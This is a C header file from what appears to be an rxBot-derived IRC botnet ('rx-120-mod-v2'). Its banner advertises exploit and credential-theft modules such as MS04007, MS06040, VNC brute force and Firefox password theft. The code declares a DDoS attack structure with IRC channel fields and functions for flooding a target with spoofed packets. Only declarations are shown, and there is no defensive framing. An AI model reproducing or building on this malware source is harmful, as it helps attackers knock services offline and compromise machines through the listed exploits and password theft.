/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
typedef struct DDOS {

	SOCKET sock;
	int threadnum;
	char ip[128];
	char port[128];
	char length[128];
	char chan[128];
	char type[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} DDOS;

DWORD WINAPI DDOSThread(LPVOID param);
long SendDDOS(unsigned long TargetIP, unsigned int SpoofingIP, char *Type, unsigned short TargetPort,int Times);
long DDOSAttack(char *target, char *port, char *type, char *len);
